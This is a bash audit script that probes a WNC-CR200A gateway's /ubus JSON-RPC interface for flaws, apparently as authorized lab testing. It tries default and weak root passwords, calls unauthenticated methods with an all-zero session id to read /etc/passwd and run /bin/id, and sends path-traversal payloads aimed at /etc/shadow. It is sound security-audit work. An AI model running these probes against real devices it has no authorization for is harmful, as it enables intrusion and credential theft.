#!/usr/bin/env bash
# probe_auth_bypass.sh — authorized auth-bypass & surface probes against the
# gateway's /ubus JSON-RPC interface.  Run from the lab VM against YOUR device.
#
# Usage: probe_auth_bypass.sh [base-url]     (default https://192.168.1.1)
#
# Tests (mapped to docs/WNC-CR200A_Web_Vulnerability_Audit.md):
#   V-05  session.login with empty/'!'/'x' passwords and a small brute sample
#   V-06  all-zero session id: enumerate the unauthenticated ubus surface
#   V-02  cgi-download path traversal probe
#   V-07  session file mode check (run locally on the device shell if available)
set -uo pipefail

BASE="${1:-https://192.168.1.1}"
UBUS="$BASE/ubus"
ZERO="00000000000000000000000000000000"
PASS="${LAB_DEVICE_PASSWORD:-}"     # optional: label password for positive control
OUT="logs/web-audit"
mkdir -p "$OUT"
LOG="$OUT/probe-$(date +%Y%m%d-%H%M%S).log"
exec > >(tee -a "$LOG") 2>&1

curlk() { curl -sk --max-time 15 -H 'Content-Type: application/json' "$@"; }

ubus() { # sid, object, method, json-params
  curlk -X POST "$UBUS" -d "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"call\",\"params\":[\"$1\",\"$2\",\"$3\",${4:-{}}]}"
}

echo "=== WNC-CR200A web auth probes — $BASE — $(date -Is) ==="

echo
echo "--- V-05: session.login password probes (user root) ---"
for pw in '' '!' 'x' 'admin' 'password' 'verizon' '12345678' $PASS; do
  rv=$(curlk -X POST "$UBUS" -d "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"call\",\"params\":[\"$ZERO\",\"session\",\"login\",{\"username\":\"root\",\"password\":\"$pw\"}]}")
  echo "  password='${pw:0:3}…' -> $(echo "$rv" | head -c 200)"
  echo "$rv" | grep -q '"ubus_rpc_session"' && { echo "  *** VULN: login accepted for password '$pw' ***"; break; }
done

echo
echo "--- V-06: unauthenticated surface (sid = all zeros) ---"
for spec in "session list" "file read {\"path\":\"/etc/passwd\"}" \
            "file exec {\"command\":\"/bin/id\"}" "uci get {\"config\":\"system\"}" \
            "luci-rpc getBoardJSON" "iwinfo devices"; do
  obj="${spec%% *}"; rest="${spec#* }"; m="${rest%% *}"; p="${rest#* }"; [ "$p" = "$m" ] && p="{}"
  rv=$(ubus "$ZERO" "$obj" "$m" "$p")
  echo "  $obj $m -> $(echo "$rv" | head -c 160)"
done

echo
echo "--- V-02: cgi-download traversal probe ---"
for f in '../../../../etc/shadow' '%2e%2e/%2e%2e/etc/shadow' '....//....//etc/passwd'; do
  code=$(curlk -o /tmp/cgidl.$$ -w '%{http_code}' "$BASE/cgi-bin/cgi-download?sessionid=$ZERO&filename=$f")
  echo "  filename=$f -> HTTP $code  $(head -c 60 /tmp/cgidl.$$ | tr -d '\n')"
  grep -qE 'root:|daemon:' /tmp/cgidl.$$ 2>/dev/null && echo "  *** VULN: file contents disclosed ***"
done
rm -f /tmp/cgidl.$$

echo
echo "--- positive control (label password, if provided) ---"
[ -n "$PASS" ] && ubus "$ZERO" session login "{\"username\":\"root\",\"password\":\"$PASS\"}" | head -c 200 || \
  echo "  (set LAB_DEVICE_PASSWORD to test a valid login)"

echo
echo "=== done. Log: $LOG — follow up with ZAP/Burp per docs/WNC-CR200A_Web_Vulnerability_Audit.md §5 ==="
